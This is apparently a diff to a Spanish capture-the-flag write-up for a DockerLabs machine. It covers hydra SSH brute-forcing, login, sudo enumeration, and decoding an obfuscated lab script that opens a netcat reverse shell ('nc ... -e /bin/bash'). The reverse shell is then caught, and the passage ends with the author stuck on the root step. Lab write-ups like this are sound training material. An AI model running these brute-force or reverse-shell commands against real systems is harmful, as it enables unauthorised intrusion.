@@ -100,6 +100,9 @@ y por supuesto:
 |
 |-- admin
 ```
+
+## FASE DE INTRUSIÓN
+
 lo primero que hago es añadir el subdomino al /etc/hosts
 ```bash
 sudo nano /etc/hosts
@@ -244,6 +247,151 @@ probé varios desencriptados y no era posible o no era reconocido, así pues lo 
 hydra -t 64 -L /opt/SecLists/Usernames/xato-net-10-million-usernames.txt -p bbb2c5e63d2ef893106fdd0d797aa97a ssh://172.17.0.2 -V -F -I
 ```
 Después de un buen rato:
+```
+[REDO-ATTEMPT] target 172.17.0.2 - login "patrick" - pass "bbb2c5e63d2ef893106fdd0d797aa97a" - 476608 of 8295509 [child 3] (4/37)
+[22][ssh] host: 172.17.0.2   login: dimer   password: bbb2c5e63d2ef893106fdd0d797aa97a
+```
 
+ojo que es la palabra 476609:dimer de  8295509 !!!!
+Pues:
+```bash
+ssh dimer@172.17.0.2
+```
 
+y la pass bbb2c5e63d2ef893106fdd0d797aa97a
 
+y estamos dentro.
+
+## ESCALADA DE PRIVILEGIOS
+
+Una vez dentro hago un cat de los usuarios :
+```bash
+cat /etc/passwd | grep sh$
+```
+```
+root:x:0:0:root:/root:/bin/bash
+dimer:x:1001:1001:dimer,,,:/home/dimer:/bin/bash
+bilter:x:1000:1000:bilter,,,:/home/bilter:/bin/bash
+purter:x:1002:1002::/home/purter:/bin/bash
+```
+ ahora ya es la tecnica de cada unp, yo suelo empeza con id, para ver si hay algún grupo al que pertenezca con
+ privilegios , en este casdo nada, luego miro la variable de entorno con printenv...no os imaginais lo que he llegado a encontrar,
+ suelo seguir con sudo -l, y en este caso:
+ ```bash
+sudo -l
+```
+```
+Matching Defaults entries for dimer on dockerlabs:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
+
+User dimer may run the following commands on dockerlabs:
+    (bilter : bilter) NOPASSWD: /opt/life.sh
+```
+puedo ejecutar ese script como bilter. hago un cat:
+```bash
+cat /opt/life.sh
+```
+#!/bin/bash
+
+set +m
+
+v1=$((0xCAFEBABE ^ 0xAC1100BA))
+v2=$((0xDEADBEEF ^ 0x17B4))
+
+a=$((v1 ^ 0xCAFEBABE))
+b=$((v2 ^ 0xDEADBEEF))
+
+c=$(printf "%d.%d.%d.%d" $(( (a >> 24) & 0xFF )) $(( (a >> 16) & 0xFF )) $(( (a >> 8) & 0xFF )) $(( a & 0xFF )))
+
+d=$((b))
+
+e="nc"
+f="-e"
+g=$c
+h=$d
+
+$e $g $h $f /bin/bash &>/dev/null &
+```
+wtf? que es eso?
+```
+#!/bin/bash
+
+set +m
+
+v1=$((0xCAFEBABE ^ 0xAC1100BA))
+v2=$((0xDEADBEEF ^ 0x17B4))
+
+a=$((v1 ^ 0xCAFEBABE))
+b=$((v2 ^ 0xDEADBEEF))
+
+c=$(printf "%d.%d.%d.%d" $(( (a >> 24) & 0xFF )) $(( (a >> 16) & 0xFF )) $(( (a >> 8) & 0xFF )) $(( a & 0xFF )))
+
+d=$((b))
+
+e="nc"
+f="-e"
+g=$c
+h=$d
+
+$e $g $h $f /bin/bash &>/dev/null &
+```
+después de hacer los cálculos:
+Los cálculos realizados en el script dan como resultado la siguiente información:
+
+-Dirección IP: 172.17.0.186
+
+-Puerto: 6068
+
+```bash
+nc 172.17.0.186 6068 -e /bin/bash
+```
+entabla una reverseshell a esa ip y por ese puerto, pues no se diga más,
+cambiamos nuestra ip
+
+```bash
+sudo ip addr add 172.17.0.186/16 dev docker0
+```
+
+me pongo a la escucha por el puerto 6068
+```bash
+sudo nc -lvnp 6068
+```
+
+y ejecuto el script
+
+```bash
+sudo -u bilter /opt/life.sh
+```
+
+ahora hacemos tratamiento de la TTY:
+
+```bash
+export TERM=xterm
+export SHELL=bash
+script /dev/null -c bash 
+^Z
+stty raw -echo; fg
+reset xterm
+stty rows 51 columns 237
+```
+
+siendo bilter, miro con id si pertenecemos a algún grupo, variables de entorno con printenv y al final :
+```bash
+sudo -l
+```
+```
+Matching Defaults entries for bilter on dockerlabs:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
+
+User bilter may run the following commands on dockerlabs:
+    (ALL : ALL) NOPASSWD: /usr/local/bin/dead.sh
+```
+
+puedo ejecutar como cualquier usuario incluido root ese script...miro los permisos y solo puedo ejecutar...pues vamos a ello
+```bash
+sudo -u root /usr/local/bin/dead.sh
+```
+```
+161
+```
+un número, pruebo a buscar archivos por si es una clave o algo y no encontré nada...y aquí estoy parado muchachos porque he probado el puerto 161 en nmap por udp y tampoco
